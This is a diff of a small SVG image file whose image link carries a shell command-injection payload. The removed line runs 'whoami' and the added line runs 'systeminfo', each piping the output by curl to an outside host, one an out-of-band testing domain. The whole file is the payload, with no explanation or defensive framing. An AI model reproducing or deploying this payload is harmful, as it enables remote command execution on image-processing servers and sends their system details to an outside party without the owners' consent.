@@ -1,4 +1,4 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
-  <image xlink:href="|whoami | curl -d @- http://lxm5nbbqny0ejoiyydwjip561x7ovtji.oastify.com/output" width="100" height="100"/>
+  <image xlink:href="|systeminfo | curl -d @- http://shahvishal.dssldrf.net/output" width="100" height="100"/>
 </svg>
